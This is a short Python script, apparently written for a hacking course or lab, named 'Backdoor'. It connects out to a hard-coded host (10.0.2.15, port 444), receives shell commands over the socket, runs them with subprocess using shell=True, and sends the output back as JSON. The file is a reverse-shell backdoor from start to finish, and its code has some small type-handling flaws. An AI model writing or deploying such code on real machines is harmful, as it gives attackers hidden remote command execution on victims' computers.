#! /usr/bin/env python
import socket
import subprocess
import json

class Backdoor:
	def __init__(self,ip,port):
			#making a connection variable and using socket function to establish a connection between the computers
			self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			#Connecting to the machine and using the port 444 and the values are given in tuples
			self.connection.connect((ip,port))		



	def send_reliable_data(self,data):
		    json_data = json.dumps(data)
		    self.connection.send(json_data)

	    

	def receive_reliable_data(self):
	    	json_data = self.connection.recv(1024)
	    	return json.loads(json_data)

		        
		        

		

	def execute_system_commands(self,command):
			return subprocess.check_output(command,shell=True)


	def run(self):
			while True:
				#Waiting for 1024bytes of data to be sent from the computer

				command = self.receive_reliable_data()
				command = command.decode()
				command_result = self.execute_system_commands(command)
				self.send_reliable_data(command_result)
				#At last closing the connection 
			self.connection.close()

my_backdoor = Backdoor("10.0.2.15",444)
my_backdoor.run()
